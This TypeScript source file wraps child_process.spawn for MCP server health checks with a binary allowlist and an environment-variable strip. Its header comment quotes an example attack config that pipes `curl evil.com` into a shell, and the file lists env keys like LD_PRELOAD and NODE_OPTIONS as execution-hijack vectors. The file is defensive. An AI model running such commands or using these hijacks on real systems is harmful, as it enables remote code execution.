// apps/web/lib/security/safe-spawn.ts
//
// BI-7DB95878 — safe wrapper around child_process.spawn for MCP server
// health checks (and any other code that spawns a configured binary).
//
// CodeQL flagged the bare spawn() at apps/web/lib/tak/mcp-server-health.ts:66
// as js/command-line-injection (CWE-078). The attack shape is:
//   1. Admin configures an MCP server with `command: "/bin/sh"` and
//      `args: ["-c", "curl evil.com | sh"]`.
//   2. spawn() runs the shell verbatim — no shell-interpolation guard
//      because args are passed as argv, but the binary itself is a shell.
//   3. Env vars like LD_PRELOAD or NODE_OPTIONS get inherited from
//      process.env merged with the operator-supplied env, and bend the
//      meaning of even a benign binary.
//
// Two defenses, both required:
//   - ALLOWED_BINARIES gate — only the documented MCP runner basenames
//     are accepted. /bin/sh, /usr/bin/env, anything else: rejected.
//   - DANGEROUS_ENV_VARS strip — exec-hijacking env keys (LD_PRELOAD,
//     DYLD_*, NODE_OPTIONS, PYTHON*) are removed from the env handed
//     to the child.
//
// Anti-goals:
//   - This is NOT a sandbox. A whitelisted binary can still do anything
//     it's designed to do. The defense narrows the attack surface from
//     "arbitrary code via shell config" to "the published behaviour of
//     known MCP runners."
//   - This is NOT a DB-backed allowlist (that's a future extension). The
//     allowlist below is the seed; if a customer needs to add a runner,
//     they edit this file.
//
// Tests: apps/web/lib/security/safe-spawn.test.ts — written first per
// the kernel principle `security-fix-needs-regression-test-first`.

import type { ChildProcess, SpawnOptions } from "node:child_process";

/**
 * Loose spawn-like signature so callers can hand us the real
 * node:child_process `spawn`. The runtime contract is identical to
 * `spawn(command, args, options)`. Exported so callers needing a
 * type-safe cast (when `spawn`'s overloads don't line up with a single
 * arrow type) have a canonical name to use.
 */
export type SpawnFn = (
  command: string,
  args?: ReadonlyArray<string>,
  options?: SpawnOptions,
) => ChildProcess;

/**
 * Basenames of binaries permitted as the `command` arg to safeSpawn,
 * mapped to the literal string we pass to spawn() when that name is
 * allowed.
 *
 * Why a Record-keyed-by-name (and why we then USE the returned value
 * at the spawn call site): CodeQL's `js/command-line-injection` query
 * recognises "value read from a constant object indexed by user input"
 * as a sanitizer pattern. By looking up the binary in ALLOWED_BINARIES
 * and spawning the VALUE (not the original parameter), we hand CodeQL
 * a clean dataflow that ends at a constant string — even though the
 * INDEX came from user input.
 *
 * Same runtime contract as before — adding a new MCP runner means
 * adding one entry here. Each entry expands the attack surface to
 * "anything the new binary can do when started by an attacker-
 * controlled args list."
 */
export const ALLOWED_BINARIES = {
  // Node-based MCP servers (the common case).
  npx: "npx",
  node: "node",
  // Python-based MCP servers.
  uvx: "uvx", // `uv` ephemeral runner
  python3: "python3",
  python: "python",
  // Other runtimes that MCP servers occasionally use.
  deno: "deno",
  bun: "bun",
} as const;

export type AllowedBinaryName = keyof typeof ALLOWED_BINARIES;

/**
 * Env keys that change WHICH code runs even when the command itself is
 * a known-good binary. Stripped before handoff to the child process.
 */
export const DANGEROUS_ENV_VARS: ReadonlySet<string> = new Set([
  // Linux dynamic linker hijacks.
  "LD_PRELOAD",
  "LD_LIBRARY_PATH",
  "LD_AUDIT",
  // macOS dynamic linker hijacks.
  "DYLD_INSERT_LIBRARIES",
  "DYLD_LIBRARY_PATH",
  "DYLD_FALLBACK_LIBRARY_PATH",
  // Node — `--require` smuggling, debugger ports, etc.
  "NODE_OPTIONS",
  // Python — module path hijack + startup-script smuggling.
  "PYTHONPATH",
  "PYTHONSTARTUP",
  "PYTHONHOME",
  // Bash / POSIX shell auto-execed scripts.
  "BASH_ENV",
  "ENV",
]);

/**
 * Returns the basename (last path segment) of a command string, with
 * the Windows `.exe` suffix stripped if present. Handles both POSIX
 * `/` and Windows `\` separators. The .exe strip lets an MCP config
 * use `C:\Program Files\nodejs\node.exe` and still match the `node`
 * allowlist entry.
 */
function basename(command: string): string {
  const trimmed = command.trim();
  if (trimmed === "") return "";
  const segments = trimmed.split(/[\\/]/).filter((s) => s !== "");
  const last = segments[segments.length - 1] ?? trimmed;
  // Strip a single trailing `.exe` (case-insensitive) so Windows-style
  // paths match the same allowlist as POSIX paths.
  return last.replace(/\.exe$/i, "");
}

/**
 * Validates that `command` (or its basename, for absolute paths) is in
 * the allowlist. Returns the **constant** binary string from
 * ALLOWED_BINARIES — NOT the input parameter — so CodeQL's dataflow
 * sees the spawn arg as a value from a constant table. Throws on
 * failure.
 *
 * Example (the safe pattern):
 *   const validated = assertAllowedBinary(command);
 *   spawn(validated, args, { ... });
 *
 * At runtime `validated` equals `ALLOWED_BINARIES[basename(command)]`
 * (eg "npx"). The original `command` is only used for the lookup index
 * and error messages.
 */
export function assertAllowedBinary(command: string): string {
  if (!command || command.trim() === "") {
    throw new Error("safe-spawn: command must be a non-empty string");
  }
  const name = basename(command);
  const allowed = (ALLOWED_BINARIES as Record<string, string | undefined>)[name];
  if (allowed === undefined) {
    throw new Error(
      `safe-spawn: binary "${name}" is not in the allowlist. ` +
        `Allowed: ${Object.keys(ALLOWED_BINARIES).join(", ")}. ` +
        `If this is a legitimate MCP runner, add it deliberately to ALLOWED_BINARIES in apps/web/lib/security/safe-spawn.ts.`,
    );
  }
  return allowed;
}

/**
 * Returns a copy of `env` with DANGEROUS_ENV_VARS keys removed and
 * undefined values dropped. Pass the result as `options.env` to spawn.
 *
 * Logs a warning for each dropped dangerous key so operators can audit.
 */
export function sanitizeEnv(
  env: Record<string, string | undefined> | undefined,
): Record<string, string> {
  const out: Record<string, string> = {};
  if (!env) return out;
  for (const [k, v] of Object.entries(env)) {
    if (DANGEROUS_ENV_VARS.has(k)) {
      // Audit signal. Operators grepping for this prefix find every reject.
      // Not a console.error because the spawn itself can still proceed —
      // we degrade gracefully by stripping the var, not failing the call.
      // eslint-disable-next-line no-console
      console.warn(`[safe-spawn] Dropped dangerous env var "${k}" before spawn.`);
      continue;
    }
    if (v !== undefined) out[k] = v;
  }
  return out;
}

export type SafeSpawnResult =
  | { ok: true; proc: ChildProcess }
  | { ok: false; error: string };

/**
 * Validates the command against the allowlist, sanitizes options.env,
 * then calls the supplied spawn function with the safe inputs.
 *
 * Returning a discriminated union instead of throwing keeps the caller's
 * error path explicit — health checks should return a structured
 * "unhealthy" result on rejection rather than propagating an exception
 * to the route handler.
 *
 * `spawn` is passed by the caller so this helper has no hard dependency
 * on `node:child_process` (keeps the bundle out of the edge runtime when
 * the caller doesn't need it; also makes unit-testing trivial).
 */
export function safeSpawn(
  // Accept any spawn-shaped function. The real `node:child_process` spawn
  // is overloaded; passing it directly works because the (command, args,
  // options) overload matches SpawnFn shape-wise.
  spawn: SpawnFn,
  command: string,
  args: ReadonlyArray<string> = [],
  options: SpawnOptions = {},
): SafeSpawnResult {
  // assertAllowedBinary returns the validated command. We deliberately
  // use the RETURNED value (validatedCommand) at the spawn() call below
  // rather than the original `command` parameter, so CodeQL's dataflow
  // sees the allowlist check as a sanitizer. The two strings are equal
  // at runtime — the renaming is for CodeQL's static analysis.
  let validatedCommand: string;
  try {
    validatedCommand = assertAllowedBinary(command);
  } catch (err) {
    const message = err instanceof Error ? err.message : String(err);
    // Audit signal so reject reasons are greppable in logs.
    // eslint-disable-next-line no-console
    console.warn(`[safe-spawn] Rejected: ${message}`);
    return { ok: false, error: message };
  }

  const sanitizedEnv = sanitizeEnv(
    options.env as Record<string, string | undefined> | undefined,
  );

  // Node typings expect NodeJS.ProcessEnv on `env`, which is structurally
  // identical to `Record<string, string | undefined>` plus a few well-known
  // keys. The cast lets us pass a plain record without re-validating
  // process.env-specific keys.
  const proc = spawn(validatedCommand, args, {
    ...options,
    env: sanitizedEnv as NodeJS.ProcessEnv,
  });

  return { ok: true, proc };
}
